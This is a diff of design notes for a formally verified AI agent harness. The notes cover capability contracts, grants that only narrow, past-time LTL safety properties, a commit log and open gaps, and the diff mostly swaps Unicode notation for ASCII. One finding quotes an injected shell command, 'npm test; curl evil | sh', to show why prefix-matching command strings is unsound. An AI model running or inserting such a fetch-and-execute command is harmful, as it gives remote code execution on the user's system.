@@ -24,24 +24,24 @@ An entire agent harness is a program in a small interpreted language, and useful
 
 ### Settled this session
 
-1. **State machine.** Start from the draft's `H = ⟨A, S, s₀, δ⟩`:
-   - `δ` is a total, deterministic `Expr` term, `S × Inp → S × List(Act)`. It is never compiled: the term that is hashed is the one that is proved and run.
+1. **State machine.** Start from the draft's `H = (A, S, s0, step)`:
+   - `step` is a total, deterministic `Expr` term, `S x Inp -> S x List(Act)`. It is never compiled: the term that is hashed is the one that is proved and run.
    - Inputs: `start`, `ret`, `end`, `failed`, `msg`, `refused`. Actions: `call`, `cancel`, `halt`.
    - Calls run concurrently, and results come back in any order the environment chooses.
 2. **"Always allow" from a subagent widens the parent's grant.** A child's grant can't exceed its parent's, so a rule the person approves "always" in a subagent must also be added to the parent's grant. By the same argument it probably extends up to the root. That follows from the rule but hasn't been confirmed.
-3. **Dynamic grants.** The interpreter, not `δ`, holds each grant's state, such as the session allowlist, and preconditions can read it. Only the root principal widens it: an "always allow" answer from `approve`, a one-time approval (an entry the matching call uses up), or a change of permission mode. Children can only narrow it. Approval rules like P1 are therefore enforced at runtime for every harness, with no per-harness proof. The cost is a larger interpreter: preconditions take grant state as a third input, there are rules for updating it, and proofs must reason about it.
+3. **Dynamic grants.** The interpreter, not `step`, holds each grant's state, such as the session allowlist, and preconditions can read it. Only the root principal widens it: an "always allow" answer from `approve`, a one-time approval (an entry the matching call uses up), or a change of permission mode. Children can only narrow it. Approval rules like P1 are therefore enforced at runtime for every harness, with no per-harness proof. The cost is a larger interpreter: preconditions take grant state as a third input, there are rules for updating it, and proofs must reason about it.
 
 ### Accepted at the end of the session
 
 Both were proposed and argued for during the session, then accepted when implementation started.
 
 **Capabilities: contracts as predicates, grants that only narrow.**
-- **Contract:** each operation has a contract `⟨In, Out, mode, pre, post, ret, effect⟩`.
+- **Contract:** each operation has a contract `(In, Out, mode, pre, post, ret, effect)`.
   - `pre` and `post` are `Expr` predicates.
-  - The interpreter checks `pre` immediately before performing the effect, whatever `δ` does.
+  - The interpreter checks `pre` immediately before performing the effect, whatever `step` does.
 - **Grant:** a grant can only be built with combinators that narrow it:
   - drop an operation;
-  - strengthen its precondition (`pre ∧ extra`);
+  - strengthen its precondition (`pre and extra`);
   - raise its return label;
   - put its names under a prefix.
 
@@ -51,12 +51,12 @@ Both were proposed and argued for during the session, then accepted when impleme
 - **Rejected alternatives:**
   - allowlists of operation names, which can't scope arguments;
   - Cedar as the native policy language, which has no history and no labels;
-  - effect types inside `δ`, which need a much larger type system;
+  - effect types inside `step`, which need a much larger type system;
   - arbitrary narrowed preconditions checked by a solver, which v0 doesn't need.
 
 **Properties: past-time LTL over labeled trace events, proved by inductive invariants.**
 - Past-time LTL compiles to a monitor whose state is added to the configuration. Proofs therefore stay inductive invariants with three obligations: initiation, consecution and safety.
-- The history the property depends on is generated mechanically, outside `δ`. With invariants alone, the author would have to add flags to `δ`'s own state and keep them correct by hand.
+- The history the property depends on is generated mechanically, outside `step`. With invariants alone, the author would have to add flags to `step`'s own state and keep them correct by hand.
 - Every formula is a safety property, and every violation has a finite counterexample trace that the kernel can replay.
 - The same formulas can be monitored at runtime before anyone proves them.
 - Rejected alternatives:
@@ -76,16 +76,16 @@ The harness is a ReAct loop with these capabilities:
 - `approve`, which a person answers;
 - a `user` channel carrying prompts and interrupts.
 
-| Property                                                               | Result                                                                                                                                                                                   |
-| ---------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| P2: no write outside the workspace                                     | A precondition on `fs.write`, so it holds for subagents inductively. Symlinks rest on assumption A1. `shell.run` is not covered without a footprint (see findings).                      |
-| P4: an interrupt stops effects until the next prompt                   | `□(out(k, call(n,_), true) ∧ effect(n) → ¬(¬in(msg(user, prompt)) S in(msg(user, interrupt))))`. Easy in past-time LTL. With invariants alone, `δ` would need a flag maintained by hand. |
-| P3: subagents never exceed the parent's grant                          | Holds by construction: a subagent's restricted tool list is the drop combinator.                                                                                                         |
-| P1: no shell command runs unless it's on the allowlist or was approved | Didn't fit as stated. It forced the findings below.                                                                                                                                      |
+| Property                                                               | Result                                                                                                                                                                                                               |
+| ---------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| P2: no write outside the workspace                                     | A precondition on `fs.write`, so it holds for subagents inductively. Symlinks rest on assumption A1. `shell.run` is not covered without a footprint (see findings).                                                  |
+| P4: an interrupt stops effects until the next prompt                   | `always((out(k, call(n,_), true) and effect(n)) implies not since(not in(msg(user, prompt)), in(msg(user, interrupt))))`. Easy in past-time LTL. With invariants alone, `step` would need a flag maintained by hand. |
+| P3: subagents never exceed the parent's grant                          | Holds by construction: a subagent's restricted tool list is the drop combinator.                                                                                                                                     |
+| P1: no shell command runs unless it's on the allowlist or was approved | Didn't fit as stated. It forced the findings below.                                                                                                                                                                  |
 
 Findings:
 
-1. Spawning must be an interpreter action, `spawn(H, grant, arg)`, not a capability. Otherwise the grant would only be enforced if the parent's `δ` were proved to enforce it.
+1. Spawning must be an interpreter action, `spawn(H, grant, arg)`, not a capability. Otherwise the grant would only be enforced if the parent's `step` were proved to enforce it.
 2. Each trace event needs an origin path saying which harness in the tree issued it, so properties can be stated about subagents.
 3. `shell.run` takes an `argv` list and runs it without a shell. Matching command strings by prefix is unsound: a `npm test` rule matches `npm test; curl evil | sh`.
 4. `effect: bool` is too coarse. Contracts need a declared footprint, an `Expr` over the arguments saying what the call may touch, vouched for by the implementation's publisher under A1.
@@ -102,11 +102,11 @@ Findings:
 | Module                                                  | Plan                                                                                                                                                                                                        |
 | ------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
 | `cbor.rs`, `kernel-abi`, `javascript/` loader and codec | Keep. Only `index.d.ts` needs rewriting.                                                                                                                                                                    |
-| `ops.rs`                                                | Keep: these are the pure operators `δ` is written with.                                                                                                                                                     |
+| `ops.rs`                                                | Keep: these are the pure operators `step` is written with.                                                                                                                                                  |
 | `types.rs`                                              | Keep, but proofs must exclude `Any`.                                                                                                                                                                        |
 | `ir.rs`                                                 | Keep the pure `Expr` core, add a bounded `fold`. Turn the `ask` hole into a hole with a grant. Remove `AskSpec`, `World`, `Fact`, `Form` and `Answer`. Add Harness, Contract, Grant, Property and Evidence. |
 | `eval.rs`                                               | Becomes the interpreter's core. Keep strict evaluation that continues past holes. Add label propagation.                                                                                                    |
-| `check.rs`                                              | Type-checks `δ` instead of an Answer.                                                                                                                                                                       |
+| `check.rs`                                              | Type-checks `step` instead of an Answer.                                                                                                                                                                    |
 | `key.rs`                                                | Keep the kind-and-version prefix. Replace the kinds.                                                                                                                                                        |
 | `claim.rs`                                              | Keep the principle that the kernel re-checks counterexamples itself and never accepts a solver's bare `unsat`. Generalize it to replaying traces against properties over runs.                              |
 | `smtlib/`                                               | Keep the `Expr` encoding for the pure fragment and rewrite the Ask-specific parts. `readings.rs` hasn't been reviewed yet.                                                                                  |
@@ -114,7 +114,7 @@ Findings:
 | `assess.rs`, `validate.rs`                              | Remove. Evidence verdicts replace them, and pre- and postconditions replace validators.                                                                                                                     |
 | `tests/`                                                | Keep as reference until replacements exist.                                                                                                                                                                 |
 
-The outline mentions a "Rust λΠ rewrite kernel", but nothing like it is in this repo.
+The outline mentions a "Rust lambda-Pi rewrite kernel", but nothing like it is in this repo.
 
 ## Implementation
 
@@ -131,7 +131,7 @@ Built in pieces on `pivot`, one commit each, with the tests green after every pi
 | Retire the Ask era            | `f02c4bb` | Asks, Answers, worlds, validators, claims and partial evaluation removed. SMT-LIB now exports typed definitions. New API and JS types.                                                                                         |
 | Compliance vectors            | `09b4037` | Eight cases in `compliance/cases/`, replayed by the Rust kernel and by the WebAssembly build.                                                                                                                                  |
 | Per-run grants                | `5d07a4a` | Each run has its own grant state. Trusted results and messages widen the receiving run and its ancestors, never siblings; what a call uses up is used up in every run.                                                         |
-| Variant types                 | `d315c97` | `Variant` types and `match`, in checking, labelled evaluation and SMT-LIB. `δ`'s input is typed by the interface, with results typed per operation.                                                                            |
+| Variant types                 | `d315c97` | `Variant` types and `match`, in checking, labelled evaluation and SMT-LIB. `step`'s input is typed by the interface, with results typed per operation.                                                                         |
 | Invariant certificates        | `6f43914` | `induction.rs` and the `invariant` method: certificates the kernel checks by initiation, consecution and safety; consecution of a state invariant as an SMT-LIB query, with solver counterexamples checked by the kernel.      |
 
 ## Decided after implementation
@@ -141,10 +141,10 @@ Built in pieces on `pivot`, one commit each, with the tests green after every pi
 
 ## Gaps the implementation surfaced
 
-1. **Events are still typed `Any`.** `δ`'s input is a variant typed by the interface, and `match` reads it precisely. A spawned child's result is `Any`, because the child's harness is chosen at run time. Reading a field that only some cases have is gradual: it is typed `Any` and checked when it runs. A property's events are not typed yet.
+1. **Events are still typed `Any`.** `step`'s input is a variant typed by the interface, and `match` reads it precisely. A spawned child's result is `Any`, because the child's harness is chosen at run time. Reading a field that only some cases have is gradual: it is typed `Any` and checked when it runs. A property's events are not typed yet.
 2. **Labels are coarse (Q1).** A harness that dispatches on `input.kind` runs every branch under the input's label, so everything it does after an untrusted result carries that label. Precise harnesses must act in response to trusted inputs, as the planner/quarantine pattern does.
 3. **Certificates are finite; obligations aren't verdicts.** An `invariant` certificate lists the configurations it holds of, so it proves properties for all depths only for harnesses with finitely many reachable configurations. Every call takes a fresh identifier, so harnesses that keep calling need the other route:
-   - An invariant of `δ`'s state, over every state and every well-typed input.
+   - An invariant of `step`'s state, over every state and every well-typed input.
    - The kernel decides initiation, and exports consecution as an SMT-LIB query.
    - It checks a solver's counterexamples. Tested end to end with z3: export, `sat`, read back, the kernel confirms.
    - A solver's `unsat` is not accepted. Accepting it needs a proof certificate the kernel can check (Alethe, LFSC), or Lean.
